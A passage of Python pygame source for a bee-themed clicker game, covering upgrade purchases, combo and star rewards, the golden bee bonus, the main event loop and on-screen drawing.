    earned = click_power * mul * combo_mult
    goo += earned; total_earned += earned
    for s in stars: s.counter += earned

    # Particles
    cnt = min(8 + combo*3, 40)
    for _ in range(cnt): parts.append(Particle(mx,my))
    for _ in range(min(combo//3+1,8)): sparkles.append(Sparkle(mx,my))

    # Float text
    col = (255,220,50) if combo < 5 else (255,150,50) if combo < 15 else (255,50,255)
    prefix = f"x{round(combo_mult,1)} " if combo > 1 else ""
    floats.append(FloatingText(mx,my,f"{prefix}+{fmt(earned)}",col,24 if combo<5 else 28))

    # Bee squish
    bee_sx = 1.20; bee_sy = 0.85; bee_anim = 0

    if combo % 10 == 0 and combo > 1:
        toasts.append(Toast(f"COMBO x{combo}! 🔥","🔥",(255,120,50)))
        shake.add(0.3)

def buy_normal(idx, mx, my):
    global goo, click_power, auto_goo, click_cd, star_enhance, baller_active, baller_t, discount_mul, gifted_star_lv, max_stars, gifted_goo_bonus, gifted_active, gifted_end
    up   = normal_ups[idx]
    cost = up["cost"]*discount_mul
    if goo < cost: return
    goo -= cost
    t = up["type"]
    if   t == "click":    click_power += 1;  msg = "+1 Click Power! 💥"
    elif t == "cooldown": click_cd = max(0.05, click_cd-0.05); msg = "Faster Clicks! ⚡"
    elif t == "auto":     auto_goo += 1;  msg = "+1 Goo/sec 🤖"
    elif t == "star":
        if len(stars) < max_stars: stars.append(GummyStar()); msg = "Star Spawned! ⭐"
        else: goo += cost; return
    elif t == "star_enh": star_enhance += 1; msg = "Stars Enhanced! ✨"
    elif t == "baller":
        baller_active=True; baller_t=time.time()
        up["cost"] *= 1.5
        for _ in range(80): parts.append(Particle(BEE_CX,BEE_CY,(200,170,255)))
        shake.add(0.7)
        floats.append(FloatingText(BEE_CX,BEE_CY,"GUMMYBALLER!!",(200,170,255),34))
        return
    for _ in range(25): parts.append(Particle(mx,my))
    for _ in range(6):  sparkles.append(Sparkle(mx,my))
    floats.append(FloatingText(mx,my,msg,(255,220,100),22))
    shake.add(0.18)
    up["cost"] *= 1.3

def buy_gifted(idx, mx, my):
    global gifted_goo, discount_mul, discount_lv, gifted_star_lv, max_stars, gifted_goo_bonus
    up = sacrifice_ups[idx]
    if gifted_goo < up["cost"]: return
    gifted_goo -= up["cost"]
    t = up["type"]
    if   t == "discount":    discount_lv+=1; discount_mul=max(0.2,1-discount_lv*0.08); up["cost"]*=1.2; msg="Discounts up! 💸"
    elif t == "gifted_star": gifted_star_lv+=1; up["cost"]*=1.1; msg="Star bonus x2! 🌟"
    elif t == "star_abuse":  max_stars+=1; up["cost"]*=3;   msg=f"Max stars: {max_stars}! 🌙"
    elif t == "gifted_grow": gifted_goo_bonus+=0.3; up["cost"]*=2; msg=f"Gifted mult: {round(gifted_goo_bonus,1)}x! 🧬"
    for _ in range(30): parts.append(Particle(mx,my,(100,255,180)))
    for _ in range(8):  sparkles.append(Sparkle(mx,my))
    floats.append(FloatingText(mx,my,msg,(150,255,200),24))
    shake.add(0.22)
    toasts.append(Toast(msg,"✅",(100,255,180)))

# ─── MAIN LOOP ─────────────────────────────────────────────────────────────
while True:
    dt = min(clock.tick(60)/1000, 0.05)
    hex_time += dt
    shake.update(dt)
    ox,oy = int(shake.off[0]), int(shake.off[1])

    mul = 5 if gifted_active else 1
    gain = auto_goo * dt * mul
    goo         += gain
    total_earned+= gain
    for s in stars: s.counter += gain

    # Combo decay
    if combo > 0:
        combo_timer -= dt
        if combo_timer <= 0: combo = 0

    # Gifted mode end
    if gifted_active and time.time() > gifted_end:
        gifted_active = False
        toasts.append(Toast("Gifted mode ended.","😪",(200,200,100)))

    # Baller trigger
    if baller_active and time.time()-baller_t >= 1:
        gifted_active = True; gifted_end = time.time()+10
        baller_active = False
        toasts.append(Toast("GIFTED MODE ACTIVATED! x5!","🔮",(200,180,255)))
        shake.add(0.9)
        for _ in range(80): parts.append(Particle(BEE_CX,BEE_CY,(200,170,255)))

    # Star expiry
    for s in stars[:]:
        s.update(dt)
        if s.expired():
            tmul = base_star_mul + star_enhance*0.5 + gifted_star_lv*2
            reward = s.counter * tmul
            goo += reward; total_earned += reward
            rising.append(RisingGoo(f"⭐ +{fmt(reward)}!"))
            for _ in range(35): parts.append(Particle(BEE_CX,BEE_CY,(255,220,50)))
            sparkles.extend(Sparkle(BEE_CX+random.uniform(-60,60),BEE_CY+random.uniform(-60,60)) for _ in range(10))
            shake.add(0.35)
            stars.remove(s)

    # Milestone checks
    for m in MILESTONES:
        if total_earned >= m and m not in milestones_hit:
            milestones_hit.add(m)
            toasts.append(Toast(f"Reached {fmt(m)} total goo!","🏆",(255,220,50)))
            for _ in range(5):
                floats.append(FloatingText(random.randint(50,490), random.randint(100,HEIGHT-100),
                    "MILESTONE!","⭐",(255,220,50),28))
            for _ in range(50): parts.append(Particle(BEE_CX,BEE_CY))
            shake.add(0.5)

    # Golden bee
    g_bee.update(dt)

    # Bee idle animation
    bee_anim += dt
    idle = math.sin(bee_anim*1.8)*0.012
    bee_sx += ((1.0+idle) - bee_sx) * min(1, dt*14)
    bee_sy += ((1.0-idle) - bee_sy) * min(1, dt*14)

    # Update particles
    for lst in (floats, parts, sparkles, rising, pollen):
        for p in lst: p.update(dt)
    floats  = [f for f in floats  if not f.dead]
    parts   = [p for p in parts   if not p.dead]
    sparkles= [s for s in sparkles if not s.dead]
    rising  = [r for r in rising   if not r.dead]
    for t2 in toasts: t2.update(dt)
    toasts  = [t for t in toasts if not t.dead]

    # ── EVENTS ────────────────────────────────────────────────────────────
    for ev in pygame.event.get():
        if ev.type == pygame.QUIT:
            pygame.quit(); sys.exit()
        if ev.type == MUSIC_END_EVENT and MUSIC_LOADED:
            try:
                pygame.mixer.music.play(-1)
            except Exception:
                pass
        if ev.type == pygame.MOUSEWHEEL:
            scroll_off = min(0, scroll_off + ev.y*22)
        if ev.type == pygame.MOUSEBUTTONDOWN:
            mx, my = pygame.mouse.get_pos()

            # Golden bee
            if g_bee.active and g_bee.rect().collidepoint(mx,my):
                rtype = g_bee.collect()
                if rtype == "boost":
                    bonus = max(2000, goo*0.12)
                    goo += bonus; total_earned += bonus
                    rising.append(RisingGoo(f"GOLDEN! +{fmt(bonus)}!"))
                    for _ in range(70): parts.append(Particle(mx,my,(255,220,0)))
                    sparkles.extend(Sparkle(mx+random.uniform(-60,60),my+random.uniform(-60,60)) for _ in range(20))
                    shake.add(0.8)
                    toasts.append(Toast(f"Golden Bee! +{fmt(bonus)} goo!","🌟",(255,220,50)))
                elif rtype == "blast":
                    bonus = click_power*120*mul
                    goo += bonus; total_earned += bonus
                    rising.append(RisingGoo(f"GOO BLAST +{fmt(bonus)}!"))
                    for _ in range(50): parts.append(Particle(mx,my,(255,150,0)))
                    shake.add(0.6)
                    toasts.append(Toast(f"Goo Blast! +{fmt(bonus)}!","💥",(255,150,50)))
                else:
                    gifted_active = True; gifted_end = time.time()+15
                    floats.append(FloatingText(mx,my,"x5 MULTIPLIER! 15s!",(200,255,100),34))
                    for _ in range(80): parts.append(Particle(mx,my,(200,255,150)))
                    shake.add(0.9)
                    toasts.append(Toast("Golden Bee: x5 MULTIPLIER! 15s!","⚡",(150,255,100)))

            # Bee click
            bee_r = pygame.Rect(BEE_CX-130, BEE_CY-130, 260, 260)
            if bee_r.collidepoint(mx,my):
                do_click(mx, my)

            # Panel
            nr, sr2, gr = get_panel_rects()
            for i,r in enumerate(nr):
                if r.collidepoint(mx,my): buy_normal(i, mx, my); break
            if sr2.collidepoint(mx,my): do_sacrifice()
            for i,r in enumerate(gr):
                if r.collidepoint(mx,my): buy_gifted(i, mx, my); break

    # ── DRAW ──────────────────────────────────────────────────────────────
    screen.fill((0,0,0))
    draw_hex_bg()

    # Pollen
    for pg in pollen: pg.draw(screen)

    # Bee glow
    if gifted_active:
        pulse = (math.sin(time.time()*5)+1)*0.5
        glow(screen,(180,255,100),( BEE_CX+ox,BEE_CY+oy),int(145+pulse*22),130)
    else:
        glow(screen,(255,190,40),(BEE_CX+ox,BEE_CY+oy),125,80)

    # Stars behind bee
    for s in stars: s.draw(screen)

    # Bee (with squish)
    bimg = bee_gifted if gifted_active else bee_normal
    bw = int(260 * bee_sx); bh = int(260 * bee_sy)
    scaled_bee = pygame.transform.scale(bimg,(bw,bh))
    screen.blit(scaled_bee,(BEE_CX - bw//2 + ox, BEE_CY - bh//2 + oy))

    # Baller
    if baller_active:
        pulse2 = (math.sin(time.time()*7)+1)*0.5
        glow(screen,(200,150,255),(BEE_CX+180,BEE_CY),int(65+pulse2*18),170)
        screen.blit(baller_img,(BEE_CX+135,BEE_CY-75))

    # Particles
    for p  in parts:    p.draw(screen)
    for sp in sparkles: sp.draw(screen)
    for ft in floats:   ft.draw(screen)
    for rg in rising:   rg.draw(screen)

    g_bee.draw(screen)

    # Right panel (drawn on separate surface to avoid particle overdraw)
    draw_panel()

    # HUD (left side stats)
    draw_hud()

    # Toasts (top right corner stacking down)
    for i,t2 in enumerate(toasts):
        t2.draw(screen, 8 + i*60)

    # Title watermark bottom left
    wm = font_xs.render("🐝 Gummy Bee Clicker — Bee Swarm Simulator", True,(100,85,130))
    screen.blit(wm,(8, HEIGHT-20))

    pygame.display.flip()